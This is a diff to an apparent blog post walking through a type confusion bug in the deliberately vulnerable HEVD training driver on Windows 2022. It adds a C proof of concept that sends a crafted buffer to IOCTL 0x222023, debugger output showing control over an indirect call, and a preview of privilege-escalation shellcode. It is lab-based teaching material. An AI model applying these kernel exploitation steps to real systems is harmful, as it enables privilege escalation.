@@ -1,6 +1,6 @@
 [Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/kernel/hevd-2) : [Part 3](https://plackyhacker.github.io/kernel/hevd-2)
 
-# HEVD Type Confusion Exploit in Windows 2022
+# HEVD Type Confusion Walkthrough on Windows 2022
 
 ## Introduction
 
@@ -116,6 +116,51 @@ I have renamed the target function to `HEVDTypeConfusion` and the IOCTL we need 
 
 ## PoC
 
+We can do some basic dynamic analysis to test our theory. The following code uses the `CreateFile` Win32 API to get a handle to the driver using the SymLink we obtained earlier. We define a character array of 16 bytes and send it to the driver using `DeviceIoControl`. Notice the parameters for this call; `hDriver` is a handle to the driver, `0x222023` is our target IOCTL, and `someData` is our test buffer:
+
+```c
+#include <stdio.h>
+#include <Windows.h>
+
+int main() {
+    // get a handle to the driver
+    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
+        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
+        return 1;
+    }
+
+    char someData[] = {
+        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42
+    };
+
+    DeviceIoControl(hDriver, 0x222023, (LPVOID)&someData, sizeof(someData), NULL, 0, NULL, NULL);
+}
+```
+
+We can compile this code and copy it to the target lab. In our kernel debugger we can set a breakpoint on the instruction where we think the vulnerability is triggered:
+
+```
+1: kd> bp HEVD+8754B
+1: kd> g
+Breakpoint 1 hit
+HEVD+0x8754b:
+fffff800`0e51754b ff5308          call    qword ptr [rbx+8]
+0: kd> dq rbx L2
+ffffd286`5abf3fa0  41414141`41414141 42424242`42424242
+```
+
+Notice that when we run the exploit in our target lab, our breakpoint is hit. When we examine the two QWORDs pointed to by `rbx` we see our test buffer. This means we control what is executed by `call qword ptr [rbx+8]`.
+
+
+
 ## Type Confusion
+
+## Next Steps
+
+In the next post we will attempt to direct execution to some malicious shellcode to escalate our privileges. To do this we need to overcome some Windows exploit mitigations, such as **SMEP**, **kASLR**, and **DEP**.
 
 [Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/kernel/hevd-2) : [Part 3](https://plackyhacker.github.io/kernel/hevd-2)
